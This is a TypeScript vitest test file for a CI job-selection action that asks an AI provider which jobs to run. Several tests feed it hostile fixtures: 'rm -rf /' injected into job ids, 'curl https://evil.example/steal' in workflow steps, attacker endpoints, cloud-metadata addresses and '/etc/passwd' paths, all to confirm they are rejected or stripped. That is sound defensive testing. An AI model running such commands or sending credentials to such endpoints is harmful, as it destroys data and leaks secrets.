import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it, vi } from 'vitest';
import { PathfinderDecisionSchema } from '../src/schemas/pathfinder.js';
import { compileGlob, matchPath } from '../src/utils/globs.js';
import { assertPublicHttpsEndpoint } from '../src/utils/endpoint.js';
import { redactSecrets, sanitizeSummary } from '../src/utils/sanitize.js';
import { normalizeRepoPath, parseChangedPathsInput, resolveInside } from '../src/utils/paths.js';
import { loadJeConfig, loadPathfinderConfig } from '../src/collectors/config.js';
import { parseCircleCi, parseGithubWorkflow, parseJenkinsfile } from '../src/collectors/workflows.js';
import { readCiInventory } from '../src/collectors/workspace-ci.js';
import { buildMonorepoEvidence, discoverProjects } from '../src/collectors/monorepo.js';
import {
  fetchActionHistory,
  listCompareFiles,
  listPullRequestFiles,
  pathsFromPushPayload,
  summarizeHistory,
} from '../src/collectors/history.js';
import { closeDependencies } from '../src/decision/graph.js';
import { applyPolicy } from '../src/decision/policy.js';
import { executePathfinder } from '../src/decision/execute.js';
import { decisionFromEvaluation, unavailableDecision } from '../src/jev/normalize.js';
import { createJevProvider } from '../src/jev/factory.js';
import { buildEvidence, buildJobQuestions } from '../src/decision/evidence.js';
import { resolveProviderSettings } from '../src/action/settings.js';
import { runAction, type ActionIO } from '../src/action/main.js';
import { readFileSync } from 'node:fs';
import type { JobDefinition, PathfinderDecision } from '../src/schemas/pathfinder.js';
import type { JevProvider } from '../src/jev/types.js';

const validDecision = {
  decision: 'SELECT_JOBS',
  run_jobs: ['unit', 'lint'],
  confidence: 0.86,
  reason_codes: ['PATH_MATCH', 'ALWAYS_RUN'],
  summary: 'API sources changed; run unit and always-on lint.',
  provisional: false,
  provider: 'vercel-ai-gateway',
};

function sampleJobs(pathHit = false): JobDefinition[] {
  return [
    { id: 'lint', paths: [], needs: [], always: true, rerunOnRecentFailure: false, pathHit: false },
    { id: 'unit', paths: ['src/**'], needs: [], always: false, rerunOnRecentFailure: false, pathHit },
    {
      id: 'integration',
      paths: ['src/api/**'],
      needs: ['unit'],
      always: false,
      rerunOnRecentFailure: true,
      pathHit: false,
    },
  ];
}

function trusted(runJobs: string[], confidence = 0.9): PathfinderDecision {
  return {
    decision: 'SELECT_JOBS',
    run_jobs: runJobs,
    confidence,
    reason_codes: ['CONFIGURED_ALLOWLIST'],
    summary: 'Jev selected jobs.',
    provisional: false,
    provider: 'vercel-ai-gateway',
  };
}

function policyInput(overrides: Partial<Parameters<typeof applyPolicy>[0]> = {}) {
  return {
    decision: trusted(['unit']),
    jobs: sampleJobs(true),
    minConfidence: 0.7,
    policy: 'warn' as const,
    requirePathHits: true,
    noChangedPaths: false,
    history: { enabled: false, available: false, failedJobCounts: {}, rerunIds: [] },
    monorepo: { affectedProjects: [], mappedJobIds: [], droppedJobIds: [], authoritative: false },
    inventory: { discovered: false, jobIds: [], sources: [], jobs: [] },
    ...overrides,
  };
}

describe('decision schema', () => {
  it('accepts a trusted selection', () => {
    expect(PathfinderDecisionSchema.safeParse(validDecision).success).toBe(true);
  });

  it('rejects decisions the executor must not apply', () => {
    const invalid = [
      { ...validDecision, confidence: 1.2 },
      { ...validDecision, decision: 'RUN_SHELL' },
      { ...validDecision, run_jobs: ['unit; rm -rf /'] },
      { ...validDecision, reason_codes: ['HACK'] },
      { ...validDecision, decision: 'ABSTAIN', run_jobs: ['unit'] },
      { ...validDecision, run_jobs: ['unit', 'unit'] },
      { ...validDecision, summary: 'x'.repeat(501) },
    ];
    for (const sample of invalid) {
      expect(PathfinderDecisionSchema.safeParse(sample).success).toBe(false);
    }
  });
});

describe('globs and paths', () => {
  it('matches github-style path globs', () => {
    expect(matchPath('src/a.ts', 'src/**/*.ts')).toBe(true);
    expect(matchPath('src/b/a.ts', 'src/**/*.ts')).toBe(true);
    expect(matchPath('src/a.js', 'src/**/*.ts')).toBe(false);
    expect(matchPath('README.md', '*.md')).toBe(true);
    expect(matchPath('docs/a.md', '*.md')).toBe(true);
    expect(matchPath('docs/guide/a.md', 'docs/**')).toBe(true);
    expect(compileGlob('src/**').test('src/a.ts')).toBe(true);
  });

  it('rejects unsafe paths and accepts repo-relative files', () => {
    expect(normalizeRepoPath('src/app.ts')).toBe('src/app.ts');
    expect(normalizeRepoPath('..\\secret')).toBeNull();
    expect(normalizeRepoPath('/etc/passwd')).toBeNull();
    expect(normalizeRepoPath('src/\napp.ts')).toBeNull();
    expect(() => parseChangedPathsInput('../secret')).toThrow(/invalid path/);
    expect(parseChangedPathsInput('["src/app.ts","src/app.ts"]')).toEqual(['src/app.ts']);
    const root = mkdtempSync(join(tmpdir(), 'jev-path-'));
    expect(() => resolveInside(root, '../outside')).toThrow(/escapes/);
  });
});

describe('endpoints and redaction', () => {
  it('allows public https endpoints and blocks credential theft targets', () => {
    expect(assertPublicHttpsEndpoint('https://jev.example.com/v1/evaluate').ok).toBe(true);
    expect(assertPublicHttpsEndpoint('http://jev.example.com/v1').ok).toBe(false);
    expect(assertPublicHttpsEndpoint('https://user:pass@jev.example.com/v1').ok).toBe(false);
    expect(assertPublicHttpsEndpoint('https://169.254.169.254/latest').ok).toBe(false);
    expect(assertPublicHttpsEndpoint('https://127.0.0.1/evaluate').ok).toBe(false);
    expect(assertPublicHttpsEndpoint('https://metadata.google.internal/').ok).toBe(false);
  });

  it('redacts secrets from summaries', () => {
    const text = redactSecrets('AI_GATEWAY_API_KEY=supersecretvalue1234567890 Bearer abcdefghijklmnopqrstuvwxyz');
    expect(text).not.toContain('supersecretvalue');
    expect(text).not.toContain('abcdefghijklmnopqrstuvwxyz');
    expect(sanitizeSummary('line\nnext')).toBe('line next');
  });
});

describe('config, CI inventory, and monorepo', () => {
  it('loads jobs and rejects cycles', () => {
    const root = mkdtempSync(join(tmpdir(), 'jev-cfg-'));
    writeFileSync(
      join(root, 'ci.yml'),
      'version: 1\njobs:\n  - id: unit\n    paths: ["src/**"]\n  - id: lint\n    always: true\n',
    );
    const loaded = loadPathfinderConfig(root, 'ci.yml', '');
    expect(loaded.jobs.map(job => job.id)).toEqual(['unit', 'lint']);
    writeFileSync(
      join(root, 'cycle.yml'),
      'version: 1\njobs:\n  - id: a\n    needs: [b]\n  - id: b\n    needs: [a]\n',
    );
    expect(() => loadPathfinderConfig(root, 'cycle.yml', '')).toThrow(/cycle/);
  });

  it('reads CI configs without copying step scripts', () => {
    const workflow = parseGithubWorkflow(
      'ci.yml',
      'jobs:\n  unit:\n    runs-on: ubuntu-latest\n    needs: lint\n    steps:\n      - run: curl https://evil.example/steal\n  lint:\n    runs-on: ubuntu-latest\n  "bad name":\n    runs-on: ubuntu-latest\n',
    );
    expect(workflow.map(job => job.jobId)).toEqual(['unit', 'lint']);
    expect(JSON.stringify(workflow)).not.toContain('curl');
    expect(workflow[0]?.needs).toEqual(['lint']);

    const circle = parseCircleCi(
      'jobs:\n  unit: {}\nworkflows:\n  test:\n    jobs:\n      - unit\n      - integration:\n          requires: [unit]\n',
    );
    expect(circle.find(job => job.jobId === 'integration')?.needs).toEqual(['unit']);
    expect(parseJenkinsfile('stage("unit") { sh "curl evil" }\nstage(\'lint\') {}\nstage("rm -rf /") {}').map(job => job.jobId)).toEqual([
      'unit',
      'lint',
    ]);

    const root = mkdtempSync(join(tmpdir(), 'jev-ci-'));
    mkdirSync(join(root, '.github', 'workflows'), { recursive: true });
    mkdirSync(join(root, '.circleci'), { recursive: true });
    writeFileSync(join(root, '.github/workflows/ci.yml'), 'jobs:\n  unit:\n    steps:\n      - run: curl evil\n');
    writeFileSync(join(root, '.circleci/config.yml'), 'jobs:\n  package: {}\n');
    writeFileSync(join(root, 'Jenkinsfile'), 'stage("deploy") {}\n');
    const inventory = readCiInventory(root, ['github-actions', 'circleci', 'jenkins'], '.github/workflows');
    expect(inventory.jobIds).toEqual(expect.arrayContaining(['unit', 'package', 'deploy']));
    expect(JSON.stringify(inventory)).not.toContain('curl');
  });

  it('discovers workspace projects and maps navigator plans', () => {
    const root = mkdtempSync(join(tmpdir(), 'jev-mono-'));
    mkdirSync(join(root, 'apps', 'web'), { recursive: true });
    writeFileSync(join(root, 'pnpm-workspace.yaml'), 'packages:\n  - apps/*\n');
    writeFileSync(join(root, 'apps/web/package.json'), JSON.stringify({ name: 'web' }));
    expect(discoverProjects(root)).toEqual([{ name: 'web', root: 'apps/web' }]);
    const evidence = buildMonorepoEvidence({
      changedPaths: ['apps/web/src/a.ts'],
      packages: [{ name: 'web', paths: ['apps/web/**'], jobs: ['unit'] }],
      allowlist: ['unit', 'lint'],
      discovered: [{ name: 'web', root: 'apps/web' }],
      plan: {
        affected_projects: ['web'],
        execution_plan: [{ project: 'web', jobs: ['unit', 'rm -rf /'] }],
      },
      authoritative: true,
    });
    expect(evidence.affectedProjects).toContain('web');
    expect(evidence.mappedJobIds).toEqual(['unit']);
    expect(evidence.droppedJobIds).toContain('rm -rf /');
  });
});

describe('history and diff clients', () => {
  it('reruns jobs that failed inside the lookback window', () => {
    const summary = summarizeHistory(
      [
        { head_branch: 'main', conclusion: 'failure', failed_jobs: ['integration'] },
        { head_branch: 'other', conclusion: 'failure', failed_jobs: ['unit'] },
      ],
      sampleJobs(),
      10,
      'main',
    );
    expect(summary.rerunIds).toEqual(['integration']);
    expect(summary.failedJobCounts.unit).toBeUndefined();
  });

  it('reads pull request files, compares, and failed jobs', async () => {
    const fetchImpl = vi.fn(async (url: string | URL | Request) => {
      const href = String(url);
      if (href.includes('/pulls/7/files?per_page=100&page=1')) {
        return new Response(JSON.stringify([{ filename: 'src/app.ts' }]), { status: 200 });
      }
      if (href.includes('/compare/')) {
        return new Response(JSON.stringify({ files: [{ filename: 'docs/a.md' }] }), { status: 200 });
      }
      if (href.includes('/actions/runs?')) {
        return new Response(
          JSON.stringify({ workflow_runs: [{ id: 4, head_branch: 'main', conclusion: 'failure' }] }),
          { status: 200 },
        );
      }
      if (href.includes('/runs/4/jobs')) {
        return new Response(JSON.stringify({ jobs: [{ name: 'unit', conclusion: 'failure' }, { name: 'bad name', conclusion: 'failure' }] }), {
          status: 200,
        });
      }
      return new Response('nope', { status: 404 });
    });
    await expect(
      listPullRequestFiles({
        fetchImpl: fetchImpl as typeof fetch,
        token: 'token',
        owner: 'JevForge',
        repo: 'demo',
        pullNumber: 7,
        timeoutMs: 1000,
      }),
    ).resolves.toEqual(['src/app.ts']);
    await expect(
      listCompareFiles({
        fetchImpl: fetchImpl as typeof fetch,
        token: 'token',
        owner: 'JevForge',
        repo: 'demo',
        base: 'aaaaaaaaaaa',
        head: 'bbbbbbbbbbb',
        timeoutMs: 1000,
      }),
    ).resolves.toEqual(['docs/a.md']);
    await expect(
      fetchActionHistory({
        fetchImpl: fetchImpl as typeof fetch,
        token: 'token',
        owner: 'JevForge',
        repo: 'demo',
        lookback: 5,
        timeoutMs: 1000,
      }),
    ).resolves.toEqual([
      { head_branch: 'main', conclusion: 'failure', failed_jobs: ['unit'] },
    ]);
    expect(pathsFromPushPayload({ commits: [{ added: ['src/a.ts'], modified: [], removed: ['old.ts'] }] }).paths).toEqual([
      'src/a.ts',
      'old.ts',
    ]);
    await expect(listCompareFiles({
      fetchImpl: fetchImpl as typeof fetch,
      token: 't',
      owner: 'JevForge',
      repo: 'demo',
      base: '0000000',
      head: 'bbbbbbbbbbb',
      timeoutMs: 1000,
    })).resolves.toEqual([]);
  });
});

describe('policy and execution', () => {
  it('partitions the allowlist and closes dependencies', () => {
    const closed = closeDependencies(['integration'], sampleJobs());
    expect(closed.ids).toEqual(['unit', 'integration']);
    const result = applyPolicy(policyInput());
    expect(result.decision).toBe('SELECT_JOBS');
    expect(result.runJobs).toEqual(['lint', 'unit']);
    expect(result.skipJobs).toEqual(['integration']);
    expect([...result.runJobs, ...result.skipJobs].sort()).toEqual(['integration', 'lint', 'unit']);
    expect(result.provisional).toBe(false);
  });

  it('applies low-confidence and unavailable policies without pretending Jev selected jobs', () => {
    const low = applyPolicy(policyInput({ decision: trusted(['unit'], 0.2) }));
    expect(low.decision).toBe('ABSTAIN');
    expect(low.runJobs).toEqual(['lint', 'unit', 'integration']);
    expect(low.reasonCodes).toContain('LOW_CONFIDENCE');
    expect(low.reasonCodes).toContain('POLICY_RUN_ALL');
    expect(low.summary).toContain('Deterministic policy warn');

    const failed = applyPolicy(policyInput({ decision: trusted(['unit'], 0.2), policy: 'fail' }));
    expect(failed.shouldFail).toBe(true);
    expect(failed.runJobs).toHaveLength(3);

    const review = applyPolicy(policyInput({ decision: unavailableDecision('vercel-ai-gateway', 'down'), policy: 'request-review' }));
    expect(review.needsReview).toBe(true);
    expect(review.decision).toBe('REQUEST_REVIEW');
    expect(review.summary).not.toContain('selected 3');

    const noop = applyPolicy(policyInput({ decision: unavailableDecision('vercel-ai-gateway', 'down'), policy: 'no-op' }));
    expect(noop.runJobs).toEqual(['lint']);
    expect(noop.reasonCodes).toContain('POLICY_NO_OP');
  });

  it('forces path hits, history reruns, and authoritative monorepo jobs inside the allowlist', () => {
    const forced = applyPolicy(
      policyInput({
        decision: trusted([]),
        jobs: sampleJobs(true),
        requirePathHits: true,
        history: { enabled: true, available: true, failedJobCounts: { integration: 1 }, rerunIds: ['integration'] },
        monorepo: { affectedProjects: ['web'], mappedJobIds: ['integration'], droppedJobIds: ['rm'], authoritative: true },
      }),
    );
    expect(forced.runJobs).toEqual(['lint', 'unit', 'integration']);
    expect(forced.historyApplied).toEqual(['integration']);
    expect(forced.reasonCodes).toEqual(
      expect.arrayContaining(['PATH_MATCH', 'HISTORY_RERUN', 'MONOREPO_AFFECTED', 'MONOREPO_JOB_DROPPED']),
    );

    const closedOnly = applyPolicy(
      policyInput({
        decision: trusted(['integration']),
        requirePathHits: false,
        jobs: sampleJobs(false),
      }),
    );
    expect(closedOnly.runJobs).toEqual(['lint', 'unit', 'integration']);
    expect(closedOnly.reasonCodes).toContain('DEPENDENCY_CLOSURE');

    const narrowed = applyPolicy(policyInput({ decision: trusted([]), requirePathHits: false, jobs: sampleJobs(true) }));
    expect(narrowed.runJobs).toEqual(['lint']);
  });

  it('asks Jev with normalized evidence and discards a schema rejection', async () => {
    let seen = '';
    const provider: JevProvider = {
      id: 'vercel-ai-gateway',
      async evaluateCiSelection(request) {
        seen = JSON.stringify(request.state);
        throw new Error('SCHEMA_REJECTED: missing boolean');
      },
    };
    const result = await executePathfinder({
      provider,
      jobs: sampleJobs(),
      changedPaths: ['src/api/a.ts'],
      pathsTruncated: false,
      minConfidence: 0.7,
      policy: 'warn',
      requirePathHits: true,
      history: { enabled: false, available: false, failedJobCounts: {}, rerunIds: [] },
      monorepo: { affectedProjects: ['web'], mappedJobIds: ['unit'], droppedJobIds: [], authoritative: false },
      inventory: {
        discovered: true,
        jobIds: ['unit'],
        sources: ['github-actions:ci.yml'],
        jobs: [],
      },
    });
    expect(seen).toContain('untrusted data');
    expect(seen).toContain('web');
    expect(seen).not.toContain('curl');
    expect(result.provisional).toBe(true);
    expect(result.reasonCodes).toContain('SCHEMA_REJECTED');
    expect(result.runJobs).toEqual(['lint', 'unit', 'integration']);
  });
});

describe('providers', () => {
  const jobs = sampleJobs(true);
  const state = buildEvidence({
    jobs,
    changedPaths: ['src/a.ts'],
    pathsTruncated: false,
    history: { enabled: false, available: false, failedJobCounts: {}, rerunIds: [] },
    monorepo: { affectedProjects: [], mappedJobIds: [], droppedJobIds: [], authoritative: false },
    inventory: { discovered: false, jobIds: [], sources: [], jobs: [] },
  });
  const { questions, keyToJob } = buildJobQuestions(jobs);

  function answers(unit = 0.92) {
    return {
      job_0: { type: 'boolean', probability: 0.2 },
      job_1: { type: 'boolean', probability: unit },
      job_2: { type: 'boolean', probability: 0.1 },
      abstain: { type: 'boolean', probability: 0.04 },
      request_review: { type: 'boolean', probability: 0.04 },
    };
  }

  it('normalizes typed answers and abstains without listing jobs', () => {
    const selected = decisionFromEvaluation(
      { provider: 'vercel-ai-gateway', modelLabel: 'typesafe-ai/jev', answers: answers() },
      state,
      keyToJob,
    );
    expect(selected.decision).toBe('SELECT_JOBS');
    expect(selected.run_jobs).toEqual(['unit']);
    expect(selected.provider).toBe('vercel-ai-gateway');

    const abstain = decisionFromEvaluation(
      {
        provider: 'typesafe-native',
        modelLabel: 'typesafe-ai/jev',
        answers: { ...answers(), abstain: { type: 'boolean', probability: 0.8 } },
      },
      state,
      keyToJob,
    );
    expect(abstain.decision).toBe('ABSTAIN');
    expect(abstain.run_jobs).toEqual([]);
  });

  it('uses the AI SDK evaluate adapter and does not fall back to another provider', async () => {
    const source = readFileSync(new URL('../src/jev/vercel-ai-gateway.ts', import.meta.url), 'utf8');
    expect(source).toContain('experimental_evaluate');
    expect(source).not.toContain('generateText');

    const evaluateImpl = vi.fn(async () => ({ answers: answers() }));
    const missing = await createJevProvider('vercel-ai-gateway', { timeoutMs: 1000, evaluateImpl }).evaluateCiSelection({
      state,
      questions,
      keyToJob,
    });
    expect(missing.reason_codes).toContain('JEV_UNAVAILABLE');
    expect(evaluateImpl).not.toHaveBeenCalled();

    const provider = createJevProvider('vercel-ai-gateway', {
      apiKey: 'test-key',
      timeoutMs: 1000,
      model: 'typesafe-ai/jev',
      evaluateImpl,
    });
    const decision = await provider.evaluateCiSelection({ state, questions, keyToJob });
    expect(provider.id).toBe('vercel-ai-gateway');
    expect(decision.run_jobs).toEqual(['unit']);
    expect(evaluateImpl).toHaveBeenCalledOnce();

    evaluateImpl.mockRejectedValueOnce(new Error('gateway down'));
    const down = await provider.evaluateCiSelection({ state, questions, keyToJob });
    expect(down.provider).toBe('vercel-ai-gateway');
    expect(down.reason_codes).toContain('JEV_UNAVAILABLE');
  });

  it('posts the same contract to native and custom endpoints and keeps response bodies out of errors', async () => {
    const fetchImpl = vi.fn(async (_url: string | URL | Request, _init?: RequestInit) =>
      new Response(JSON.stringify({ answers: answers() }), { status: 200 }),
    );
    const native = createJevProvider('typesafe-native', {
      apiKey: 'native-key',
      endpoint: 'https://jev.example.com/v1/evaluate',
      model: 'typesafe-ai/jev',
      timeoutMs: 1000,
      fetchImpl: fetchImpl as typeof fetch,
    });
    const decision = await native.evaluateCiSelection({ state, questions, keyToJob });
    expect(decision.provider).toBe('typesafe-native');
    const call = fetchImpl.mock.calls[0]?.[1];
    if (!call?.headers) throw new Error('missing request');
    expect(String((call.headers as Record<string, string>).authorization)).toContain('Bearer');
    expect(String(call.body)).toContain('typesafe-ai/jev');
    expect(String(call.body)).not.toContain('native-key');

    const refused = await createJevProvider('custom-compatible', {
      apiKey: 'k',
      endpoint: 'http://evil.example/v1',
      model: 'jev',
      timeoutMs: 1000,
      fetchImpl: fetchImpl as typeof fetch,
    }).evaluateCiSelection({ state, questions, keyToJob });
    expect(refused.summary).toContain('HTTPS');
    expect(fetchImpl).toHaveBeenCalledOnce();

    fetchImpl.mockResolvedValueOnce(new Response('secret-body-should-not-leak', { status: 500 }));
    const failed = await createJevProvider('custom-compatible', {
      apiKey: 'k',
      endpoint: 'https://jev.example.com/v1',
      model: 'jev',
      timeoutMs: 1000,
      fetchImpl: fetchImpl as typeof fetch,
    }).evaluateCiSelection({ state, questions, keyToJob });
    expect(failed.summary).not.toContain('secret-body');
    expect(failed.provider).toBe('custom-compatible');
  });

  it('refuses repository-controlled endpoints', () => {
    const resolved = resolveProviderSettings({
      config: {
        jev_provider: 'custom-compatible',
        jev_endpoint: 'https://evil.example/steal',
        jev_model: 'jev',
      },
      trustRepoEndpoint: false,
    });
    expect(resolved.refusal).toMatch(/repository config/);
    expect(
      resolveProviderSettings({
        inputModel: 'typesafe-ai/custom',
        config: { jev_endpoint: 'https://evil.example' },
        trustRepoEndpoint: false,
      }).model,
    ).toBe('typesafe-ai/custom');
  });
});

function io(root: string, inputs: Record<string, string>, extras: Partial<ActionIO> = {}): ActionIO & { outputs: Record<string, string>; failed: string[]; warnings: string[] } {
  const outputs: Record<string, string> = {};
  const failed: string[] = [];
  const warnings: string[] = [];
  return {
    inputs,
    env: {},
    workspace: root,
    eventName: 'workflow_dispatch',
    payload: {},
    repo: { owner: '', repo: '' },
    fetch: vi.fn(async () => {
      throw new Error('network should not be called');
    }) as typeof fetch,
    info: () => undefined,
    warning: message => warnings.push(message),
    setOutput: (name, value) => {
      outputs[name] = value;
    },
    setFailed: message => failed.push(message),
    summary: () => undefined,
    outputs,
    failed,
    warnings,
    ...extras,
  };
}

describe('action runtime', () => {
  function writeConfig(root: string, extra = '') {
    mkdirSync(join(root, '.jev'), { recursive: true });
    writeFileSync(
      join(root, '.jev/ci-pathfinder.yml'),
      `version: 1\njobs:\n  - id: lint\n    always: true\n  - id: unit\n    paths: ["src/**"]\n    rerun_on_recent_failure: true\n${extra}`,
    );
  }

  it('warns and runs the allowlist when Jev credentials are missing', async () => {
    const root = mkdtempSync(join(tmpdir(), 'jev-run-'));
    writeConfig(root);
    const runtime = io(root, { changed_paths: 'src/app.ts' });
    await runAction(runtime);
    expect(runtime.failed).toEqual([]);
    expect(runtime.outputs.decision).toBe('ABSTAIN');
    expect(runtime.outputs.provisional).toBe('true');
    expect(JSON.parse(runtime.outputs.run_jobs)).toEqual(['lint', 'unit']);
    expect(runtime.outputs.summary).toContain('Deterministic policy warn');
    expect(runtime.warnings.length).toBeGreaterThan(0);
  });

  it('calls the configured provider and still enforces always-on jobs', async () => {
    const root = mkdtempSync(join(tmpdir(), 'jev-run-'));
    writeConfig(root);
    mkdirSync(join(root, '.github/workflows'), { recursive: true });
    writeFileSync(
      join(root, '.github/workflows/ci.yml'),
      'jobs:\n  unit:\n    steps:\n      - run: curl https://evil.example/steal\n',
    );
    const fetchImpl = vi.fn(async () => new Response(JSON.stringify({
      answers: {
        job_0: { type: 'boolean', probability: 0.1 },
        job_1: { type: 'boolean', probability: 0.95 },
        abstain: { type: 'boolean', probability: 0.02 },
        request_review: { type: 'boolean', probability: 0.02 },
      },
    }), { status: 200 }));
    const runtime = io(
      root,
      {
        changed_paths: 'src/app.ts',
        jev_provider: 'typesafe-native',
        jev_endpoint: 'https://jev.example.com/evaluate',
        jev_model: 'typesafe-ai/jev',
      },
      { env: { TYPESAFE_API_KEY: 'native-secret' }, fetch: fetchImpl as typeof fetch },
    );
    await runAction(runtime);
    expect(runtime.failed).toEqual([]);
    expect(runtime.outputs.decision).toBe('SELECT_JOBS');
    expect(JSON.parse(runtime.outputs.run_jobs)).toEqual(['lint', 'unit']);
    expect(runtime.outputs.jev_provider).toBe('typesafe-native');
    expect(JSON.stringify(runtime.outputs)).not.toContain('curl');
    expect(JSON.stringify(runtime.outputs)).not.toContain('native-secret');
  });

  it('does not send credentials to an endpoint checked into the repo', async () => {
    const root = mkdtempSync(join(tmpdir(), 'jev-run-'));
    writeConfig(root);
    writeFileSync(
      join(root, '.jev/config.yml'),
      'jev_provider: custom-compatible\njev_endpoint: https://evil.example/steal\njev_model: jev\n',
    );
    const fetchImpl = vi.fn(async () => {
      throw new Error('must not fetch');
    });
    const runtime = io(root, { changed_paths: 'src/app.ts' }, { fetch: fetchImpl as typeof fetch, env: { JEV_CUSTOM_API_KEY: 'secret' } });
    await runAction(runtime);
    expect(fetchImpl).not.toHaveBeenCalled();
    expect(runtime.outputs.summary).toContain('repository config');
    expect(runtime.outputs.jev_provider).toBe('custom-compatible');
  });

  it('fails closed on invalid config and records history plus pull request paths', async () => {
    const root = mkdtempSync(join(tmpdir(), 'jev-run-'));
    const runtime = io(root, {});
    await runAction(runtime);
    expect(runtime.failed[0]).toMatch(/Missing pathfinder config/);

    writeConfig(root);
    writeFileSync(
      join(root, '.jev/ci-history.json'),
      JSON.stringify({ runs: [{ head_branch: 'main', conclusion: 'failure', failed_jobs: ['unit'] }] }),
    );
    const fetchImpl = vi.fn(async (url: string | URL | Request) => {
      expect(String(url)).toContain('/pulls/9/files');
      return new Response(JSON.stringify([{ filename: 'src/app.ts' }]), { status: 200 });
    });
    const withHistory = io(
      root,
      { include_history: 'true', history_branch: 'main', token: 'ghs_test', dry_run: 'false' },
      {
        eventName: 'pull_request',
        payload: { pull_request: { number: 9 } },
        repo: { owner: 'JevForge', repo: 'demo' },
        fetch: fetchImpl as typeof fetch,
      },
    );
    await runAction(withHistory);
    expect(JSON.parse(withHistory.outputs.affected_paths)).toEqual(['src/app.ts']);
    expect(JSON.parse(withHistory.outputs.history_applied)).toEqual(['unit']);
    expect(withHistory.outputs.reason_codes).toContain('HISTORY_RERUN');
  });

  it('loads shared provider defaults from .jev/config.yml', () => {
    const root = mkdtempSync(join(tmpdir(), 'jev-je-'));
    mkdirSync(join(root, '.jev'), { recursive: true });
    writeFileSync(join(root, '.jev/config.yml'), 'min_confidence: 0.8\nlow_confidence_policy: fail\n');
    expect(loadJeConfig(root).min_confidence).toBe(0.8);
  });
});
